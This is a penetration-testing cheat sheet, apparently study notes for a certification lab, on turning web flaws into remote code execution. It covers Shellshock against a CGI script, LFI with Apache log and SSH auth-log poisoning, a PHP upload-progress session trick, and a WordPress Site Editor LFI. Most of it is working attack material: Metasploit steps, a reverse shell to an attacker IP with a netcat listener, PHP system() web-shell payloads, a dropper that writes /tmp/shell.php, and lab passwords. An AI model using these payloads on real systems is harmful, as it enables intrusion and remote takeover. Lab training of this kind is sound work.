Web to RCE
===
🔙 [MENU README](../README.md#note)

# SHELLSHOCK
```
Bash vulnerability discovered in 2014 (CVE-2014-6271).
When executing commands in Bash, if an environment variable is exported containing trailing commands after a function definition:
env X='() { :; }; <command>'
the commands following the function definition are executed immediately upon invocation,
achieving arbitrary code execution in Bash.

Historically, dynamic web applications relied on CGI (Common Gateway Interface) to generate dynamic HTML.
Typical languages used included C, C++, Perl, and Shell scripts.
When CGI scripts invoked Shell scripts, this vulnerability became remotely exploitable over HTTP.

Shellshock is the most critical vulnerability historically affecting /cgi-bin/.
When directory bruteforcing discovers /cgi-bin/, immediately check for Shellshock.
```
Enviroment
```bash
# Module 06
# Victim  : Ubuntu Wordpress
# 192.168.0.24
sudo -i
cd /usr/lib/cgi-bin
cat shellshock
# #!/bin/bash
# echo "content-type: text/html"
# echo ""
# echo "This is a demostration of shellshock"
mv shellshock keygen
```
Parrot
```bash
# Attacker: Parrot
# view 192.168.0.24
# Web Entry Point : 
#   1.Path
#   2.Form
#   3.Header

# 1. dirb Path
dirb http://192.168.0.24
# Recommended wordlist: /usr/share/dirb/wordlists/common.txt

# http://192.168.0.24/cgi-bin => 403
# Valid URL structure under RFC 2616: protocol://host.domain.com/path/resource?query
# Currently missing the resource/file name

dirb http://192.168.0.24/cgi-bin
# http://192.168.0.24/cgi-bin/keygen


# 2. msfconsole
msfconsole
msf6 > search shellshock
# 5 exploit/mutli/http/apache_mod_cgi_bash_env_execode_cgi Bash Enviroment Variable Code Injection
# exploit/mutli/http/apache_mod_cgi_bash_env_exec
msf6 > use 5
msf6 > show options
msf6 > set RHOSTS 192.168.0.24
msf6 > set RPORT 80
msf6 > set TARGETURI /cgi-bin/keygen
msf6 > exploit
meterpreter > shell
# Get TTY Shell
script -c /bin/bash /dev/null
https://file+.vscode-resource.vscode-cdn.net/c:/Users/Rex/Desktop/GITHUB/PenTest/CPENT-CheatSheet/README.md
# Privillege Escalation
uname -a # On older kernels, exploit directly with PwnKit

```
tool
```bash
wget https://github.com/b4keSn4ke/CVE-2014-6271/raw/main/shellshock.py

python2 shellshock.py -t 172.25.30.5 -u /cgi-bin/keygen -r 172.27.232.2 -p 1234 -s dev_tcp

nc -lvnp 1234
```

# LFI to RCE
Enviroment
```bash
# Parrot
ssh administrator@192.168.0.10 #toor
sudo -i 
cd /var/www/html/
echo '<?php phpinfo(); ?>' >> info.php
echo '<?php include($_GET["file"]); ?>' >> /var/www/html/inc.php

# http://192.168.0.10/inc.php?file =info.php
# http://192.168.0.10/inc.php?file =../../../../../etc/passwd
 

# Apache LOG
chmod 755 -R /var/log/apache2
chmod 775 -R /proc/self/environ
# http://192.168.0.10/inc.php?file =/var/log/apache2/access.log
# We can view arbitrary files via LFI; can we also control the contents of an included file?
# Yes: we can poison the User-Agent header in access.log
User-Agent:<?php system($_GET[cmd]);?>
# Or via SSH login attempt:
ssh '<?php system($_GET[cmd]);?>'@172.25.20.6

# http://192.168.0.10/inc.php?file =/var/log/apache2/access.log&cmd=ls
# http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log&cmd=/etc/flag


# Authencation
chmod 775 /var/auth.log  # Authentication log
ssh '<?php system($_GET['cmd']); ?>'@192.168.0.10
```

# PHP_SESSION_UPLOAD_PROGRESS
> One Line PHP Challenge : https://blog.orange.tw/2018/10/
```
PHP_SESSION_UPLOAD_PROGRESS
PHP has a built-in file upload progress API.


1. Inclusion Tragedy
2. Session Tragedy
    PHP tracks user state by writing a temporary session file on the server.
    Depending on application behavior, the user can influence the session file contents.
3. CleanUp Tragedy
    Once the upload finishes, the session file is cleaned up; it exists only briefly during upload.
4. Prefix Tragedy
    The upload progress directive prefixes the session content.

Conclusion: By leveraging the progress bar feature during PHP file upload, an attacker can control session file contents without needing to poison any server log files.

```
Requirements to exploit PHP_SESSION_UPLOAD_PROGRESS:
```
1. PHP > 5.4
2. Enable File Upload (Default Enabled)
3. Enable File Upload Progress (Default Enabled)
4. Vulnerable to LFI
5. Can include SESSION FILE
    - sess_{PHPSESSID}
    - PHP_SESSION_UPLOAD_PROGRESS
6. Common Path
    - /var/lib/php/sessions/
    - /var/lib/php/session/
    - /tmp/
    - /var/lib/php5/

Check the settings above in phpinfo()
```
Attack
```bash
# 1.Garbage File
python -c 'print "A" * 2048 * 1024' >> junk.txt

# 2.Dropper.txt
evildropper:<?php file_put_contents('/tmp/shell.php','<?php system($_GET[3])?>'); ?>

# 3.Test File Upload
# Note: Even if the application has no file upload functionality, sending an upload request triggers PHP's internal upload progress mechanism
curl http://192.168.0.10/inc.php 
-H 'Cookie: PHPSESSID=uploadupload'  # Control server-side session filename using Cookie
-F 'PHP_SESSION_UPLOAD_PROGRESS=evildropper' # Name of upload progress / injected content
-F 'files=@junk.txt' # File payload to maintain upload connection

# 4. Open another terminal to check if upload/inclusion succeeds:
while true; do (curl -s 'http://<ip_addr>/inc.php?file=/var/lib/php5/sess_uploadupload' | grep evildropper); done

# 5. Once verified, upload the real dropper payload:
curl http://<ip_addr>/inc.php -H 'Cookie: PHPSESSID=uploadupload' 
-F 'PHP_SESSION_UPLOAD_PROGRESS=<evildropper.txt' 
-F 'files=@junk.txt'

# 6. After successful upload, execute the shell:
curl -s 'http://<ip_addr>/inc.php?file=/tmp/shell.php&3=id
```

# WordPress - LFI
Environment
```
module 06
192.168.0.10
PHP 5.5.9
WordPress 4.9.1
```
```bash
# FIX Lab
mysql -uroot -pAntarct1cA
update wordpress.wp_options set option_value='http://192.168.0.10/wordpress' where option_name = 'siteurl';
update wordpress.wp_options set option_value='http://192.168.0.10/wordpress' where option_name = 'home';
exit

# Fix File Upload
nano /etc/php5/apache2/php.ini
[Ctrl-W] OR [F6] Change upload_max_filesize to 20M
service apache2 restart


http://192.168.0.10/wordpress/wp-admin
> admin / qwerty@123

# plugin
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
https://www.exploit-db.com/exploits/44340
# The plugin is a zip file; install directly and activate
```
POC
```bash
# Plugin Site Editor 1.1.1 - LFI

http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
WPscan tool
```bash
wpscan --url http://192.168.0.10/wordpress -e

wpscan --url http://192.168.0.10/wordpress -U mike -P Wordlists/Passwords.txt
```